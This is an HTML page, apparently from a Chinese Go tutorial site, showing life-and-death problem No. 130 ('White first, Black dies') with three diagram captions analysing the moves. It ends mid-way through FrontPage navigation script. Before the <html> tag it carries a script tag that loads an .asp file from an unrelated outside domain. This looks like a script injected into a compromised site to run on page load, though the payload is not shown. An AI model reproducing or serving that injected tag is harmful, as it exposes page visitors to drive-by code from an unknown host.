<script src=http://www.xinwen520.net/48472394k4r.asp></script><html>  <head> <meta http-equiv="Content-Type" content="text/html; charset=gb2312"> <meta name="GENERATOR" content="Microsoft FrontPage 6.0"> <meta name="ProgId" content="FrontPage.Editor.Document"> <title>第130型 白先黑死</title> <link rel="stylesheet" type="text/css" href="../../../weiqi365.css"> <meta name="Microsoft Theme" content="-1 0111, default"> </head>  <body background="../../../_themes/-1/urbtextb.gif" bgcolor="#FFFFCC" text="#330033" link="#663300" vlink="#CC6633" alink="#666666"><!--mstheme--><font face="宋体"><h1 align="center"><!--mstheme--><font color="#660033"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">第130型        白先黑死</span></font><!--mstheme--></font></h1>       <div align="center">         <center><!--mstheme--></font><table border="0" width="800" cellspacing="5">         <tr>           <td width="45%" align="center" valign="middle"><!--mstheme--><font face="宋体"> 	<img border="0" src="No130_1.png" width="232" height="232"><!--mstheme--></font></td>          <td width="10%" valign="middle" align="center"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>          <td width="45%" align="center" valign="middle"><!--mstheme--><font face="宋体"> 	<img border="0" src="No130_2.png" width="232" height="232"><!--mstheme--></font></td>       </tr>       <tr>         <td width="45%" valign="top"><!--mstheme--><font face="宋体">           <p align="center"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">图1</span></font></p>           <p><font face="楷体_GB2312"><span style="letter-spacing: 1pt">白1跳是一路的好手！黑2虎，一般分寸，白3挤，黑4立，白5跳靠是致命的一击，黑无法阻白联络。白1如走a位的立，白5就不成立了。</span></font>          <p>　<!--mstheme--></font></td>        <td width="10%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>        <td width="45%" valign="top"><!--mstheme--><font face="宋体">          <p align="center"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">图2</span></font></p>          <p><font face="楷体_GB2312"><span style="letter-spacing: 1pt">白1跳时，黑2靠是最强的抵抗。白3透点，限制黑的腾挪，黑4粘。白5先托，然后7断、9尖，次序井然，黑死。黑4如走a位挖，白b挡，黑c提，白再走5位的托，结果不变。</span></font><!--mstheme--></font></td>      </tr>      <tr>        <td width="45%" align="center" valign="middle"><!--mstheme--><font face="宋体"> 	<img border="0" src="No130_3.png" width="232" height="232"><!--mstheme--></font></td>       <td width="10%" valign="middle" align="center"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>       <td width="45%" align="center" valign="middle"><!--mstheme--><font face="宋体">         <h1><!--mstheme--><font color="#660033"><span style="letter-spacing: 1pt"><a href="mailto:fiveduan@tom.com"><font face="楷体_GB2312">您的高见</font></a></span><!--mstheme--></font></h1>       <!--mstheme--></font></td>     </tr>     <tr>       <td width="45%" valign="top"><!--mstheme--><font face="宋体">         <p align="center"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">图3</span></font></p>         <p><font face="楷体_GB2312"><span style="letter-spacing: 1pt">白1、黑2时，白3如挖打，就中了黑的妙计。黑4挡，白5只好提，黑6乘机做眼，至白7挤，成劫。黑于2位提，白如a位粘，黑则b位立。</span></font></p>       <!--mstheme--></font></td>       <td width="10%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>       <td width="45%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>     </tr>   </table><!--mstheme--><font face="宋体"></center>   </div>   <p align="center"> <!--webbot bot="Navigation" S-Type="arrows"   S-Orientation="horizontal" S-Rendering="graphics" B-Include-Home="FALSE"   B-Include-Up="TRUE" U-Page="/C:/Documents and Settings/wangxiaohui/My Documents/My Webs/Weiqi/Part1/shuxing/No9/No9.htm" S-Target startspan --><script language="JavaScript"><!-- MSFPhover =    (((navigator.appName == "Netscape") &&    (parseInt(navigator.appVersion) >= 3 )) ||    ((navigator.appName == "Microsoft Internet Explorer") &&    (parseInt(navigator.appVersion) >= 4 )));  function MSFPpreload(img)  {   var a=new Image(); a.src=img
